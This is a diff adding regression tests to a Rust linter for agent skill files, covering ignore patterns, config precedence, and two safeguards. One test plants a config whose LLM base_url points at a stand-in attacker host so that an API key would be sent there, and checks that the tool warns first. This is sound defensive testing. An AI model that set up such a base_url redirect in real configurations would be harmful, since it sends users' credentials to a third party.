@@ -100,6 +100,128 @@ fn a_clean_base_exits_zero_and_says_so() {
     assert!(stdout(&output).contains("Nothing to report"));
 }
 
+/// Regression for https://github.com/MaximeGaudin/slint/issues/39 —
+/// a `!`-prefixed pattern used to compile as a literal glob that nothing matches, so the
+/// "keep this one back" half of the list was silently dropped.
+#[test]
+fn a_negated_pattern_takes_a_path_back_from_the_ignore_list() {
+    let temporary = tempfile::tempdir().unwrap();
+    let root = temporary.path();
+
+    write(
+        root.join("fixtures").as_path(),
+        "keep-me",
+        "---\nname: keep-me\ndescription: Culls a photo shoot in Lightroom by flagging the keepers and rejecting the rest. Use when triaging RAW files after a session.\n---\n\n## Keep\n\n1. Import the files.\n",
+    );
+    write(root.join("fixtures").as_path(), "drop-me", BROKEN);
+    fs::write(
+        root.join("slint.toml"),
+        "ignore = [\"**/fixtures/**\", \"!**/fixtures/keep-me/**\"]\n",
+    )
+    .unwrap();
+
+    let output = slint(&[root.to_str().unwrap(), "--no-llm"]);
+
+    let stdout = stdout(&output);
+    assert!(
+        stdout.contains("keep-me"),
+        "the negated pattern must take its folder back: {stdout}"
+    );
+    assert!(
+        !stdout.contains("drop-me"),
+        "the plain pattern must still ignore its folder: {stdout}"
+    );
+}
+
+/// Regression for https://github.com/MaximeGaudin/slint/issues/29 —
+/// the first path's config governed every path, so a later path's own config was read by
+/// nobody and said nothing.
+#[test]
+fn a_later_path_with_its_own_config_is_named_when_the_first_path_governs() {
+    let temporary = tempfile::tempdir().unwrap();
+    let root = temporary.path();
+
+    // Both names are generic enough to trip name/not-generic, different enough not to trip
+    // the project rules.
+    write(
+        root.join("alpha").as_path(),
+        "helper",
+        "---\nname: helper\ndescription: Culls a photo shoot in Lightroom by flagging the keepers and rejecting the rest. Use when triaging RAW files after a session.\n---\n\n## Helper\n\n1. Import the files.\n",
+    );
+    write(
+        root.join("beta").as_path(),
+        "utils",
+        "---\nname: utils\ndescription: Restores a corrupted drive image by verifying the checksums and repacking the volumes. Use when a restore fails halfway through.\n---\n\n## Utils\n\n1. Verify the checksums.\n",
+    );
+    fs::write(
+        root.join("beta").join("slint.toml"),
+        "[rules]\n\"name/not-generic\" = \"off\"\n",
+    )
+    .unwrap();
+
+    // alpha first: no config of its own, so the run uses defaults — but beta's file must be
+    // named, because it is the file that does not get to speak.
+    let output = slint(&[
+        root.join("alpha").to_str().unwrap(),
+        root.join("beta").to_str().unwrap(),
+        "--no-llm",
+    ]);
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(
+        stderr.contains("slint.toml"),
+        "beta's config must be named: {stderr}"
+    );
+    assert!(stderr.contains("beta"), "{stderr}");
+    // And the first path's config really did govern: beta's "off" was not applied.
+    assert!(stdout(&output).contains("name/not-generic"));
+    assert_eq!(output.status.code(), Some(2), "{stderr}");
+
+    // beta first: its config is the one that governs, and alpha has no file, so there is
+    // nothing to warn about.
+    let output = slint(&[
+        root.join("beta").to_str().unwrap(),
+        root.join("alpha").to_str().unwrap(),
+        "--no-llm",
+    ]);
+
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(
+        stderr.is_empty(),
+        "no config is ignored in this order: {stderr}"
+    );
+}
+
+/// Regression for https://github.com/MaximeGaudin/slint/issues/42 —
+/// two config files in one directory used to let the second be read by nobody, with no sign.
+#[test]
+fn two_config_files_in_one_directory_say_which_one_wins() {
+    let temporary = tempfile::tempdir().unwrap();
+    write(temporary.path(), "photo-culling", GOOD);
+    fs::write(
+        temporary.path().join("slint.toml"),
+        "[rules]\n\"name/not-generic\" = \"off\"\n",
+    )
+    .unwrap();
+    fs::write(
+        temporary.path().join("slint.config.json"),
+        r#"{ "rules": { "name/not-generic": "off" } }"#,
+    )
+    .unwrap();
+
+    let output = slint(&[temporary.path().to_str().unwrap(), "--no-llm"]);
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(
+        stderr.contains("slint.toml"),
+        "the file that won must be named: {stderr}"
+    );
+    assert!(
+        stderr.contains("slint.config.json"),
+        "the file that was ignored must be named: {stderr}"
+    );
+    // The warning is a warning: it changes what is printed, not the result.
+    assert_eq!(output.status.code(), Some(0), "{stderr}");
+}
+
 /// Regression for https://github.com/MaximeGaudin/slint/issues/53 —
 /// a typo in an LLM flag used to hard-fail a static run in which the value is never read,
 /// the way a leftover flag from a shared script does.
@@ -618,7 +740,7 @@ fn a_rule_pack_named_by_the_config_runs_beside_the_built_in_rules() {
         "---\nname: photo-culling\ndescription: Culls a photo shoot in Lightroom by flagging the keepers and rejecting the rest. Use when triaging RAW files after a session.\n---\n\n## Culling\n\n1. TODO write this properly.\n",
     );
 
-    let output = slint(&[temporary.path().to_str().unwrap(), "--no-llm"]);
+    let output = slint(&[temporary.path().to_str().unwrap(), "--no-llm", "--plugins"]);
 
     assert_eq!(output.status.code(), Some(1), "the pack's rule is an error");
     assert!(stdout(&output).contains("house/no-todo"));
@@ -861,6 +983,84 @@ fn an_undeclared_host_specific_tool_in_the_body_is_reported() {
         text.contains("AskQuestion"),
         "finding should name the tool:\n{text}"
     );
+}
+
+#[test]
+fn a_base_url_that_came_from_the_config_warns_before_anything_is_sent() {
+    let temporary = tempfile::tempdir().unwrap();
+
+    fs::write(
+        temporary.path().join("slint.toml"),
+        "[llm]\nprovider = \"openai\"\nmodel = \"gpt-mock\"\napi_key_env = \"SLINT_TEST_EXFIL_KEY\"\nbase_url = \"https://attacker.example/v1\"\n",
+    )
+    .unwrap();
+
+    write(temporary.path(), "photo-culling", GOOD);
+
+    let output = slint(&[temporary.path().to_str().unwrap(), "--llm"]);
+
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(
+        stderr.contains("attacker.example"),
+        "a config-file base_url must be called out loudly before the key is sent: {stderr}"
+    );
+    assert!(
+        stderr.contains("SLINT_TEST_EXFIL_KEY"),
+        "the warning must name the variable whose key goes to that address: {stderr}"
+    );
+
+    // The same address, chosen on the command line, is the user's own decision: no warning.
+    let overridden = slint(&[
+        temporary.path().to_str().unwrap(),
+        "--llm",
+        "--llm-base-url",
+        "https://openrouter.ai/api/",
+    ]);
+    let overridden_stderr = String::from_utf8_lossy(&overridden.stderr).to_string();
+    assert!(
+        !overridden_stderr.contains("attacker.example"),
+        "an address the user typed is not the config's to warn about: {overridden_stderr}"
+    );
+}
+
+#[test]
+fn a_plugin_named_by_the_config_does_not_run_unless_asked_for() {
+    let temporary = tempfile::tempdir().unwrap();
+
+    fs::write(
+        temporary.path().join("slint.toml"),
+        "[[plugins]]\npath = \"./house.toml\"\n",
+    )
+    .unwrap();
+    fs::write(
+        temporary.path().join("house.toml"),
+        "[[rules]]\nname = \"house/no-todo\"\nseverity = \"error\"\nsummary = \"No TODO markers.\"\nrationale = \"An agent follows what is written, and a TODO reads as an instruction.\"\nadvice = \"Finish the step.\"\npattern = \"TODO\"\nreference = { title = \"House style\", url = \"https://example.com/style\" }\n",
+    )
+    .unwrap();
+
+    write(
+        temporary.path(),
+        "photo-culling",
+        "---\nname: photo-culling\ndescription: Culls a photo shoot in Lightroom by flagging the keepers and rejecting the rest. Use when triaging RAW files after a session.\n---\n\n## Culling\n\n1. TODO write this properly.\n",
+    );
+
+    // A config found inside the scanned tree names code that belongs to that tree. Running it
+    // without being asked is the failure this test exists to keep out.
+    let without = slint(&[temporary.path().to_str().unwrap(), "--no-llm"]);
+    assert_eq!(
+        without.status.code(),
+        Some(0),
+        "a plugin named by the scanned project's own config must not run by default"
+    );
+    assert!(!stdout(&without).contains("house/no-todo"));
+
+    let with = slint(&[temporary.path().to_str().unwrap(), "--no-llm", "--plugins"]);
+    assert_eq!(
+        with.status.code(),
+        Some(1),
+        "opting in runs the pack's rules"
+    );
+    assert!(stdout(&with).contains("house/no-todo"));
 }
 
 // ---- https://github.com/MaximeGaudin/slint/issues/54 — CLI affordances ----
